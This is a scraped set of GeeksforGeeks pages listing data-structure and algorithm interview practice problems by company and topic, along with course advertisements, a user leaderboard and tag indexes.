Order Traversal Implement Queue using Stack Maximum Width of Tree SAP Labs : Sort an array of 0s, 1s and 2s Check if a number is Bleak Reverse words in a given string Remove Spaces from string Second Largest Check if a number is power of another number Reverse a linked list Get minimum element from stack BFS traversal of graph Find median in a stream of integers Quick Sort GCD of Array LCM And GCD Heap Sort Bubble Sort VMware : Longest Common Subsequence Maximum Index Array to BST Egg Dropping Puzzle K’th smallest element Check for BST Finding middle element in a linked list Reverse a linked list Detect Loop in linked list Run Length Encoding Height of Binary Tree Infix to Postfix Diameter of Binary Tree Mirror Tree Boolean Matrix Problem Cisco : Missing number in array Reverse words in a given string Permutations of a given string Array to BST Counbt set bits Reverse a linked list Level order traversal Minimum Spanning Tree Does array represent Heap Kth largest element in a stream Escape the jail K’th smallest element Insertion Sort Bubble Sort Goldman Sachs : Reverse words in a given string Overlapping rectangles Column name from a given column number Non Repeating Character Total Decoding Messages Sum Tree Get minimum element from stack Flattening a Linked List Sort a stack using Recursion Intersection Point in Y Shapped Linked Lists Stock buy and sell Egg Dropping Puzzle Check for Balanced Tree Check if two arrays are equal or not Implement Queue using Stacks MakeMyTrip : Distinct palindromic substrings Two water Jug problem Minimum Cost Path Transpose of Matrix Smallest window in a string containing all the characters of another string Check Mirror in N-ary tree Longest Prefix Suffix Maximum Difference Nuts and Bolts Problem N meetings in one room String formation from substring Longest Common Subsequence Next Permutation Trailing zeroes in factorial Egg Dropping Puzzle Snapdeal : Fighting the darkness Money Division Group Anagrams Together Pangram Strings 0 – 1 Knapsack Problem Longest Arithmetic Progression Next greater number set digits Number of Coins Check If two Line segments Intersect Two numbers with sum closest to zero Parenthesis Checker Maximum Rectangular Area in a Histogram Smallest Positive missing number Find the number of islands Reverse a Linked List in groups of given size Qualcomm : Find length of Loop Implement strstr Min distance between two given nodes of a Binary Tree Delete a node from BST Left View of Binary Tree Intersection Point in Y Shapped Linked Lists Check for BST Reverse a linked list Detect Loop in linked list Reverse Bits Next Permutation Array Subset of another array Set Bits Find Prime numbers in a range Subsequence matching Payu : Reverse each word in a given string First non-repeating character in a stream Next larger element 0 – 1 Knapsack Problem Leaders in an array Trapping Rain Water Pattern Searching Implement Atoi Lowest Common Ancestor in a Binary Tree Level order traversal in spiral form Flattening a Linked List Finding middle element in a linked list Missing number in array Kadane’s Algorithm Count possible ways to construct buildings Intuit : Element with left side smaller and right side greater Find median in a stream Product array puzzle Count Occurences of Anagrams Maximum Sub Array Binary Array Sorting Sort a Stack Find the number of islands Remove duplicates from an unsorted linked list Implement LRU Cache Max Rectangle Reverse a linked list Pairwise swap elements of a linked list by swapping data Find the missing no in string Depth First Traversal for a Graph Important Links : Difficulty-wise ordered Coding questions for Interview and Competitive Programming Aptitude questions asked in round 1 : Placements Course designed for this purpose. MCQs asked from different computer science subjects : Subject-Wise Quizzes Interview theory and coding questions of all companies : Company wise all practice questions. Interview experiences of all companies : Interview corner. You may also check our latest online course series to learn DS & Algo is named DSA, which covers everything about Data Structures from Basic to Advanced. This is a 10 weeks long online certification program specializing in Data Structures & Algorithms which includes pre-recorded premium Video lectures & programming questions for practice. You will learn algorithmic techniques for solving various computational problems and will implement more than 200 algorithmic coding problems. This course offers you a wealth of programming challenges that you may face at your next job interview. The course focuses mainly on Data Structure & Algorithms: the key to selection in top product based companies. Key Features of the Course Well organised tutorials on Data-Structures and Algorithms prepared by the GeeksforGeeks Team. Premium video lectures by Mr. Sandeep Jain, Founder and C.E.O of GeeksforGeeks. Dedicated doubt solving team to assist you. Weekly Assessment Tests with Video Solutions. Performance-Based Certificate. Internship Opportunities at GeeksforGeeks. The courses are self-paced: Anyone can register anytime, make payment and begin the course. And, many more. The course is available in two versions: With Doubt Assistance: The price of the self-paced online DSA course with doubt assistance is INR 3,999. Click here to purchase your ticket. Without Doubt Assistance: The price of the self-paced online DSA course without doubt assistance is INR 2,499. Click here to purchase your ticket . Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Recommended Posts:Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Questions for Companies like TCS, CTS, HCL, IBM …How to attempt Function Coding Questions?Must have books for Placements PreparationA Must Do Free Interview Preparation Course by GeeksforGeeksWhy Data Structures and Algorithms are "Must Have" for Developers and Where to learn them : AnsweredPlacement 100 : Complete Interview Preparation package you must have this Placement SeasonTop 3 tips an interviewee must have in mindMinimum number of rabbits that must be present in the forestHow to answer a coding question in an Interview?Practice for cracking any coding interview10 Most asked Questions from Java ProgrammersTop 10 algorithms in Interview QuestionsCommonly asked Interview Questions for Front End DevelopersSQL Interview QuestionsJava Interview Questions on ConstructorsTop 20 Dynamic Programming Interview QuestionsTop 20 Greedy Algorithms Interview QuestionsTop 20 Backtracking Algorithm Interview QuestionsTop 20 Hashing Technique based Interview QuestionsImproved By : mrindiadev Article Tags : Articlesinterview-preparationplacement preparation thumb_up 48 To-do Done 3.3 Based on 72 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page TCS Codevita Interview Experience 2020 (Digital Offer) Next last_page Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, … Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 1 (Asymptotic Analysis)find command in Linux with examplesAnalysis of Algorithms | Set 3 (Asymptotic Notations) More related articles in Articles Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)How to write a Pseudo Code?Understanding "extern" keyword in CMutex vs SemaphoreAnalysis of Algorithms | Set 4 (Analysis of Loops) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ... - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Resume Writing For InternshipMust Do Coding Questions for Companies like Amazon, Microsoft, Adobe, …Must Do Coding Questions Company-wisePractice for cracking any coding interviewHow to begin with Competitive Programming?Top 10 Algorithms and Data Structures for Competitive ProgrammingN Queen Problem | Backtracking-3Printing all solutions in N-Queen ProblemWarnsdorff’s algorithm for Knight’s tour problemThe Knight’s tour problem | Backtracking-1Rat in a Maze | Backtracking-2Count number of ways to reach destination in a MazeCount all possible paths from top left to bottom right of a mXn matrixPrint all possible paths from top left to bottom right of a mXn matrixUnique paths in a Grid with ObstaclesUnique paths covering every non-obstacle block exactly once in a gridDepth First Search or DFS for a GraphBreadth First Search or BFS for a GraphLevel Order Binary Tree TraversalTree Traversals (Inorder, Preorder and Postorder)Inorder Tree Traversal without RecursionInorder Tree Traversal without recursion and without stack!Print Postorder traversal from given Inorder and Preorder traversalsConstruct Tree from given Inorder and Preorder traversalsConstruct a Binary Tree from Postorder and InorderWhat is Memory Leak? How can we avoid? Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, … Last Updated: 10-11-2020 As the placement season is back so are we to help you ace the interview. We have selected some most commonly asked and must do practice problems for you. You can also take part in our mock placement contests which will help you learn different topics and practice at the same time, simulating the feeling of a real placement test environment. Note : Now you can track your progress of these questions Must Do Interview Preparation Course. Topic : Arrays String Linked List Stack and Queue Tree and BST Heap Recursion Hashing Graph Greedy Dynamic Programming Divide and Conquer Backtracking Bit Magic Arrays : Subarray with given sum Count the triplets Kadane’s Algorithm Missing number in array Merge two sorted arrays Rearrange array alternatively Number of pairs Inversion of Array Sort an array of 0s, 1s and 2s Equilibrium point Leaders in an array Minimum Platforms Reverse array in groups K’th smallest element Trapping Rain Water Pythagorean Triplet Chocolate Distribution Problem Stock buy and sell Element with left side smaller and right side greater Convert array into Zig-Zag fashion Last Index of 1 Spirally traversing a matrix Largest Number formed from an Array Solved the above? Go for some more Questions String : Reverse words in a given string Permutations of a given string Longest Palindrome in a String Recursively remove all adjacent duplicates Check if string is rotated by two places Roman Number to Integer Anagram Remove Duplicates Form a Palindrome Longest Distinct Characters in the string Implement Atoi Implement strstr Longest Common Prefix Solved the above? Go for some more Questions Linked List : Finding middle element in a linked list Reverse a linked list Rotate a Linked List Reverse a Linked List in groups of given size Intersection point in Y shaped linked lists Detect Loop in linked list Remove loop in Linked List n’th node from end of linked list Flattening a Linked List Merge two sorted linked lists Intersection point of two Linked Lists Pairwise swap of a linked list Add two numbers represented by linked lists Check if Linked List is Palindrome Implement Queue using Linked List Implement Stack using Linked List Given a linked list of 0s, 1s and 2s, sort it Delete without head pointer Stack and Queue : Parenthesis Checker Next larger element Queue using two Stacks Stack using two queues Get minimum element from stack LRU Cache Circular tour First non-repeating character in a stream Rotten Oranges Maximum of all subarrays of size k Tree : Print Left View of Binary Tree Check for BST Print Bottom View of Binary Tree Print a Binary Tree in Vertical Order Level order traversal in spiral form Connect Nodes at Same Level Lowest Common Ancestor in a BST Convert a given Binary Tree to Doubly Linked List Write Code to Determine if Two Trees are Identical or Not Given a binary tree, check whether it is a mirror of itself Height of Binary Tree Maximum Path Sum Diameter of a Binary Tree Number of leaf nodes Check if given Binary Tree is Height Balanced or Not Serialize and Deserialize a Binary Tree Solved the above? Go for some more Questions Heap : Find median in a stream Heap Sort Operations on Binary Min Heap Rearrange characters Kth largest element in a stream Merge K sorted linked lists Kth largest element in a stream Recursion : Flood fill Algorithm Number of paths Combination Sum – Part 2 Special Keyboard Josephus problem Hashing : Relative Sorting Sorting Elements of an Array by Frequency Largest subarray with 0 sum Common elements Find all four sum numbers Swapping pairs make sum equal Count distinct elements in every window Array Pair Sum Divisibility Problem Longest consecutive subsequence Array Subset of another array Find all pairs with a given sum Find first repeated character Zero Sum Subarrays Minimum indexed character Check if two arrays are equal or not Uncommon characters Smallest window in a string containing all the characters of another string First element to occur k times Check if frequencies can be equal Graph : Depth First Traversal Breadth First Traversal Detect cycle in undirected graph Detect cycle in a directed graph Topological sort Find the number of islands Implementing Dijkstra Minimum Swaps Strongly Connected Components Shortest Source to Destination Path Find whether path exist Minimum Cost Path Circle of Strings Floyd Warshall Alien Dictionary Snake and Ladder Problem Greedy : Activity Selection N meetings in one room Coin Piles Maximize Toys Page Faults in LRU Largest number possible Minimize the heights Minimize the sum of product Huffman Decoding Minimum Spanning Tree Shop in Candy Store Geek collects the balls Dynamic Programming : Minimum Operations Max length chain Minimum number of Coins Longest Common Substring Longest Increasing Subsequence Longest Common Subsequence 0 – 1 Knapsack Problem Maximum sum increasing subsequence Minimum number of jumps Edit Distance Coin Change Problem Subset Sum Problem Box Stacking Rod Cutting Path in Matrix Minimum sum partition Count number of ways to cover a distance Egg Dropping Puzzle Optimal Strategy for a Game Shortest Common Supersequence Divide and Conquer : Find the element that appears once in sorted array Search in a Rotated Array Binary Search Sum of Middle Elements of two sorted arrays Quick Sort Merge Sort K-th element of two sorted Arrays Backtracking : N-Queen Problem Solve the Sudoku Rat in a Maze Problem Word Boggle Generate IP Addresses Bit Magic : Find first set bit Rightmost different bit Check whether K-th bit is set or not Toggle bits given range Set kth bit Power of 2 Bit Difference Rotate Bits Swap all odd and even bits Count total set bits Longest Consecutive 1’s Sparse Number Alone in a couple Maximum subset XOR Some More Questions on Arrays : Find Missing And Repeating Maximum Index Consecutive 1’s not allowed Majority Element Two numbers with sum closest to zero Nuts and Bolts Problem Boolean Matrix Problem Smallest Positive missing number Jumping Caterpillars Some More Questions on Strings : Most frequent word in an array of strings CamelCase Pattern Matching String Ignorance Smallest window in a string containing all the characters of another string Design a tiny URL or URL shortener Permutations of a given string Non Repeating Character Check if strings are rotations of each other or not Save Ironman Repeated Character Remove common characters and concatenate Geek and its Colored Strings Second most repeated string in a sequence Some more Questions on Trees : Mirror Tree Longest consecutive sequence in Binary tree Bottom View of Binary Tree Lowest Common Ancestor in a Binary Tree Binary to DLL Important Links : Difficulty-wise ordered Coding questions for Interview and Competitive Programming Aptitude questions asked in round 1 : Placements Course designed for this purpose. MCQs asked from different computer science subjects : Subject-Wise Quizzes Interview theory and coding questions of all companies : Company wise all practice questions. Interview experiences of all companies : Interview corner. You may also check our latest online course series to learn DS & Algo is named DSA, which covers everything about Data Structures from Basic to Advanced. Key Features of the Course Well organised tutorials on Data-Structures and Algorithms prepared by the GeeksforGeeks Team. Premium video lectures by Mr. Sandeep Jain, Founder and C.E.O of GeeksforGeeks. Dedicated doubt solving team to assist you. Assessment Tests with Video Solutions. Performance-Based Certificate. Internship Opportunities at GeeksforGeeks. The courses are self-paced: Anyone can register anytime, make payment and begin the course. And, many more. The course is available in two versions: With Doubt Assistance: The price of the self-paced online DSA course with doubt assistance is INR 3,999. Click here to purchase your ticket. Without Doubt Assistance: The price of the self-paced online DSA course without doubt assistance is INR 2,499. Click here to purchase your ticket . Preparing for AMAZON SDE Interview? Do check out Geeksforgeeks Amazon SDE Test-Series. The price of the online AMAZON Test-Series course is INR 499. Geeks Classes Live An interview centric Live session focused on DSA to enhance your coding & problem-solving skills for product-based companies. The price of the LIVE Geeks Class course is INR 9,999. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Recommended Posts:Must Do Questions for Companies like TCS, CTS, HCL, IBM …Why companies like Amazon, Microsoft, Google focuses on Data Structures and Algorithms : AnsweredMust Do Coding Questions Company-wiseHow to attempt Function Coding Questions?Guide for Non-CS students to get placed in Software companiesWhat is the future of those students who are getting selected in mass recruiting companiesAmazon Interview QuestionsAmazon’s most frequently asked interview questions | Set 2Must have books for Placements PreparationA Must Do Free Interview Preparation Course by GeeksforGeeksWhy Data Structures and Algorithms are "Must Have" for Developers and Where to learn them : AnsweredPlacement 100 : Complete Interview Preparation package you must have this Placement SeasonTop 3 tips an interviewee must have in mindMinimum number of rabbits that must be present in the forestHow to answer a coding question in an Interview?Practice for cracking any coding interview10 Most asked Questions from Java ProgrammersTop 10 algorithms in Interview QuestionsCommonly asked Interview Questions for Front End DevelopersSQL Interview Questions Article Tags : Articlesinterview-preparationplacement preparation thumb_up 541 To-do Done 3.4 Based on 292 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Must Do Coding Questions Company-wise Next last_page Cisco Systems Interview Experience | On-Campus 2021 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 1 (Asymptotic Analysis)find command in Linux with examplesUnderstanding "extern" keyword in C More related articles in Articles How to write a Pseudo Code?Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Mutex vs SemaphoreSQL | GROUP BY room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Practice | GeeksforGeeks | A computer science portal for geeks Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit Popular Company Tags Amazon Microsoft Oracle Samsung Adobe Synopsys Infosys Cisco Wipro Ola-Cabs Morgan-Stanley Goldman-Sachs show more Popular Topic Tags Maths Array Dynamic-Programming Greedy-Algorithm Hashing Tree Bit-Algorithm Matrix Backtracking Operating System Linked-List Graph show more OverAll Monthly *Results get updated in every half hour. Search Rank User Overall Score 1 Ibrahim Nash 5729 2 blackshadows 5685 3 akhayrutdinov 5111 4 mb1973 4989 5 Quandray 4916 6 saiujwal13083 4156 7 sanjay05 3762 8 marius_valentin_dragoi 3511 9 sushant_a 3455 10 verma_ji 3320 11 KshamaGupta 3318 12 the_coder95 3302 13 mantu_singh 3158 14 raj_271 3058 15 lonewolf13325 3007 16 surbhi_7 2985 17 GB11 2872 18 SumitSingh27 2850 19 ********** 2843 20 mcakannan 2818 21 md1844 2798 22 vicky_ 2782 23 ArbazGrewal 2777 24 bhatabhi554 2765 25 SayanDutta1 2752 26 navya_rg 2702 27 Memoization 2701 28 descifrador 2670 29 rohanm 2661 30 1rn18_mahima_mahendru 2609 31 RemoveTLE 2607 32 vatsal1999 2575 33 jagrit_07 2566 34 RaviMaurya98 2543 35 Praveen Shankar Thooyavan 2523 36 wmlam 2500 37 Aditya_Thakur 2500 38 its_codingz 2498 39 riyagarg7d 2497 40 rajupraaa1234 2494 41 tushargupta09 2492 42 heimanth 2484 43 Little Noah 2471 44 sr06 2471 45 loveumom 2470 46 Pulkit__Sharma__ 2463 47 maheshpondugula5 2460 48 chinnaswami8mutuswami8venugopala8iyer 2458 49 Survivor 2445 50 dharmsharma0811 2432 Rank User Overall Score « ‹ 1 2 3 4 5 6 7 8 9 10 › » Next × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Programming Problems grouped by Company & Topic Tags | Practice | GeeksforGeeks Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit Popular Company Tags Amazon Microsoft Oracle Samsung Adobe Synopsys Infosys Cisco Wipro Ola-Cabs Morgan-Stanley Goldman-Sachs show more Popular Topic Tags Maths Array Dynamic-Programming Greedy-Algorithm Hashing Tree Bit-Algorithm Matrix Backtracking Operating System Linked-List Graph show more Data Structures Arrays [677] Strings [512] Hash [187] Matrix [135] Tree [134] Linked List [113] Graph [96] Stack [82] Binary Search Tree [59] Queue [51] Heap [43] Map [32] Segment-Tree [26] Trie [23] priority-queue [7] Data Structures [3] Binary Indexed Tree [1] AVL-Tree [1] Algorithms Mathematical [858] Dynamic Programming [274] Sorting [149] Bit Magic [145] Searching [124] Recursion [75] Prime Number [74] Numbers [62] sieve [53] Greedy [53] Combinatorial [47] DFS [40] Modular Arithmetic [38] series [36] Fibonacci [35] Divide and Conquer [34] Binary Search [34] palindrome [29] Backtracking [28] BFS [27] Geometric [21] Binary Representation [21] Algorithms [12] Game Theory [8] Merge Sort [4] Machine Learning [1] Languages Java [172] CPP [144] Others STL [135] Java-Collections [67] number-theory [56] Misc [44] sliding-window [39] Practice-Problems [32] Tutorial-Problems [30] python-loops [27] python-io [25] pattern-printing [24] permutation [24] logical-thinking [22] two-pointer-algorithm [21] doubly-linked-list [19] python-operators [19] python-list [18] python-strings [17] factorial [16] Operators [12] prefix-sum [11] python-conditionals [11] modular arithmetic [10] set [10] constructive algo [10] Regular Expression [9] Division [9] circular-linked-list [8] Traversal [8] Java-Strings [8] python [8] python-functions [8] Date-Time [7] Java-BigInteger [7] OOP [7] Data Type [7] Class [6] Java-Class and Object [6] subset [5] CPP-Control-Flow [5] Disjoint Set [5] Pattern Searching [5] logarithm [4] Factorization [4] inclusion-exclusion [4] Java-Control-Flow [4] Puzzles [4] Kadane [4] implementation [4] cpp-strings [4] python-dict [3] cpp-operator [3] python-set [3] cpp-pointers [3] Java-Operators [2] Probability [2] Pointers [2] Character Encoding [2] Gauss Elimination [2] Range Minimum Query [2] union-find [2] Quantifiers [2] anagram [2] Functions [2] circular linked list [2] cryptography [1] Computer Networks [1] c-lang [1] Shortest Path [1] Physics [1] alphabets [1] Operating Systems [1] Reverse [1] Sqrt Decomposition [1] CPP-Control-Flow [1] × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Practice | GeeksforGeeks | A computer science portal for geeks Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit Popular Company Tags Amazon Microsoft Oracle Samsung Adobe Synopsys Infosys Cisco Wipro Ola-Cabs Morgan-Stanley Goldman-Sachs show more Popular Topic Tags Maths Array Dynamic-Programming Greedy-Algorithm Hashing Tree Bit-Algorithm Matrix Backtracking Operating System Linked-List Graph show more AllSchoolBasicEasyMediumHard All Subjective Problems Answers Views Topics Tags Company Tags Dynamic Programming 2 1 3783 Dynamic Programming Swap two numbers 2 2467 Algorithms How to Measure 45 minutes using two identical wires? 2 3929 Puzzles 10 stacks of 10 identical-looking coins 2 3274 Puzzles Measuring 6L water from 4L and 9L buckets 1 2739 Puzzles What runs the javascript in the browser? 8 3169 Web Development Capgemini What is reflection? 15 2537 Java Capgemini MVC action methods 3 2003 Java | Spring Capgemini Method overriding 26 2076 Java Capgemini Inversion of Control 2 3 1658 Java | Spring Capgemini Inversion of Control 2 2289 Java | Spring Capgemini Connection to database 8 4061 DBMS Capgemini Remote Method Invocation (RMI) 1 1910 Java Capgemini Dynamic dispatch method 4 2099 Java Capgemini Some real life applications of machine learning 8 3237 Machine Learning Capgemini Infinite primes 2 1400 Mathematical | Prime Number Can I submit solutions of a practice problem in multiple programming languages? 2 1377 Misc To what power of 10 does the prefix giga-refers? What is equivalent of power 2? 2 1253 Mathematical | Misc Bus error on my creation of memset, please clarify what is going under the hood? 1 1842 Arrays | C | Heap | Troubleshoot Single Test case vs Multiple Test cases 11 5528 CPP | Java | Java-Collections | python | SQL Text color and address swapping C++ 0 1320 CPP | Troubleshoot Question about number storage in C 1 1440 Binary Representation | Data Structures | memory | Troubleshoot Printing value of a vector by v.begin() 1 1932 STL Newline in C 41 1773 C | Misc Preorder to postorder conversion BST question 0 1518 Binary Search Tree | Tree | Troubleshoot Next Popular Topic Tags for Subjective Java C++ Computer Networks SQL Android Design Patterns Linux Puzzle Software-Engineering DBMS Popular Company Tags for Subjective Zomato Cognizant Directi TCS Expedia SAP-Labs D-E-Shaw Intuit Accenture Amdocs Weekly Monthly Overall vakanksh20 56 c2h4a1r2 40 abhinavrayakwar 37 suhasjvrundavan 34 sainipankaj1708 26 nishunishuraj18 602 swastik8750 599 afaltu95 467 shashi1iitk 398 george444emmanuel 393 Ibrahim Nash 5725 blackshadows 5685 akhayrutdinov 5111 mb1973 4989 Quandray 4916 Leaderboard (Overall) × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Practice | GeeksforGeeks | A computer science portal for geeks Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit × Mathematical Arrays Strings Dynamic Programming Hash Sorting Bit Magic Matrix Tree Greedy Java Searching Stack CPP STL Graph Prime Number Recursion Linked List Heap Numbers Misc number-theory sieve Binary Search Binary Search Tree Modular Arithmetic Queue DFS Java-Collections Combinatorial priority-queue series Map sliding-window Fibonacci logical-thinking Backtracking Segment-Tree BFS Divide and Conquer two-pointer-algorithm palindrome Geometric permutation Trie pattern-printing Binary Representation factorial Practice-Problems Tutorial-Problems Game Theory python-loops python-io Algorithms Traversal doubly-linked-list constructive algo implementation prefix-sum modular arithmetic Operators Division OOP python-operators python-list python-strings Regular Expression set subset Data Type Disjoint Set Date-Time Pattern Searching python-conditionals Kadane Factorization circular-linked-list Data Structures Java-Strings logarithm python-functions python Class inclusion-exclusion Functions Puzzles Java-BigInteger Probability Gauss Elimination Java-Class and Object Range Minimum Query Binary Indexed Tree Shortest Path Physics Merge Sort CPP-Control-Flow cryptography Lazy Propagation alphabets Quantifiers cpp-strings Java-Control-Flow Pointers union-find anagram circular linked list Character Encoding cpp-operator python-set Sqrt Decomposition analytics Reverse cpp-pointers python-dict Java-Operators mod C composite LCS Operating Systems Graph colouring quotient quadratic Computer Networks AVL-Tree Machine Learning Super Increasing Seq Structures CPP-Control-Flow Match Making permutatuins radix sort c-lang × Amazon Microsoft Adobe Samsung Accolite Zoho Paytm Goldman Sachs Snapdeal MakeMyTrip Google Flipkart Morgan Stanley Walmart FactSet OYO Rooms D-E-Shaw Ola Cabs SAP Labs Oracle Hike MAQ Software Directi VMWare Facebook Visa Cisco Qualcomm Linkedin Intuit Wipro Yahoo Payu BankBazaar TCS Codenation Yatra.com Housing.com Citrix Salesforce InMobi PayPal ABCO Synopsys Rockstand Times Internet Twitter Myntra Infosys Moonfrog Labs Teradata Accenture 24*7 Innovation Labs Nagarro Drishti-Soft Groupon GE InfoEdge One97 Juniper Networks Nutanix Opera CarWale Expedia Quikr Oxigen Wallet Epic Systems Boomerang Commerce Brocade Zillious Streamoid Technologies TinyOwl Aricent Amdocs OATS Systems BrowserStack Jabong Polycom Belzabar Apple Kritikal Solutions GreyOrange IBM Philips CouponDunia Airtel Fab.com Cognizant United Health Group Grofers MetLife Bloomberg Service Now National Instruments Veritas nearbuy Sapient Junglee Games Tesco Tejas Network Nvidia Mobicip Rivigo Intel Pubmatic Bidgely Kuliza Vizury Interactive 